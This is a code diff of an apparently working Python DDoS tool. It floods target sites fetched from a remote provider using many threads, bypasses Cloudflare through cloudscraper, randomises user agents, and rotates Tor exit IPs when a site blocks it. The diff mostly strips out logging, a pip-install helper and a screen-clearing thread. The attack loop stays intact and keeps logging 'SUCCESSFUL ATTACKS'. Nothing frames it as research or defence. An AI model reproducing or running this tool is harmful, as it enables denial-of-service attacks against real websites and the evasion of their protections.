@@ -1,22 +1,16 @@
-import os
-import platform
-from argparse import ArgumentParser
 from concurrent.futures import ThreadPoolExecutor
-from gc import collect
-from os import system
-from sys import stderr
-from threading import Thread
-from time import sleep
 from random import choice
+from sys import stderr
 
 import cloudscraper
+from argparse import ArgumentParser
 from loguru import logger
 from pyuseragents import random as random_useragent
 from requests.exceptions import ConnectionError
 from urllib3 import disable_warnings
 
-from settings import get_settings
 from remote_provider import RemoteProvider
+from settings import get_settings
 from tor_proxy import TorProxy
 
 settings = get_settings()
@@ -45,6 +39,7 @@ threads = int(args.threads)
 executor = ThreadPoolExecutor(max_workers=threads)
 tor_proxy = TorProxy(port=settings.TOR_PORT, control_port=settings.TOR_CONTROL_PORT, password=settings.TOR_PASSWORD)
 
+
 def set_logger_format():
     logger.remove()
     logger.add(
@@ -56,13 +51,6 @@ def set_logger_format():
         format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
             <cyan>{line}</cyan> - <white>{message}</white>",
         level="SUCCESS")
-
-
-def check_req():
-    os.system("python3 -m pip install -r requirements.txt")
-    os.system("python -m pip install -r requirements.txt")
-    os.system("pip install -r requirements.txt")
-    os.system("pip3 install -r requirements.txt")
 
 
 def make_attack(site: str, scraper):
@@ -83,11 +71,7 @@ def mainth(site: str):
     headers = settings.HEADERS_TEMPLATE
     headers['User-Agent'] = random_useragent()
     scraper.headers.update(headers)
-
-    logger.info(f"STARTING ATTACK TO {site}")
-
     attacks_number = 0
-
     try:
         attack = scraper.get(site, timeout=settings.READ_TIMEOUT)
         if attack.status_code >= 302:
@@ -103,18 +87,15 @@ def mainth(site: str):
                     )
                     loop_attacks_number, response_code = make_attack(site, scraper)
                     attacks_number += loop_attacks_number
-                    logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response_code}")
             else:
                 tor_proxy.change_ip()
                 logger.info(f"USING tor proxy with ip {tor_proxy.get_ip()}")
                 scraper.proxies.update(tor_proxy.get_sock5_proxies())
                 attacks_count, response_code = make_attack(site, scraper)
                 attacks_number += attacks_count
-                logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response_code}")
         else:
             attacks_count, response_code = make_attack(site, scraper)
             attacks_number += attacks_count
-            logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response_code}")
         if attacks_number > 0:
             logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
     except ConnectionError:
@@ -125,35 +106,14 @@ def mainth(site: str):
     executor.submit(mainth, choice(remoteProvider.get_target_sites()))
 
 
-def clear():
-    if platform.system() == "Linux":
-        return system('clear')
-    else:
-        return system('cls')
-
-
-def cleaner():
-    while True:
-        sleep(60)
-        if not no_clear:
-            clear()
-        collect()
-
-
 if __name__ == '__main__':
     try:
         set_logger_format()
-        if not no_clear:
-            clear()
-        check_req()
-
-        Thread(target=cleaner, daemon=True).start()
         while True:
             sites = remoteProvider.get_target_sites()
             # initially start as many tasks as configured threads
             for _ in range(threads):
                 executor.submit(mainth, choice(sites))
-            collect()
     except KeyboardInterrupt:
         logger.info("Shutdown")
         executor.shutdown()
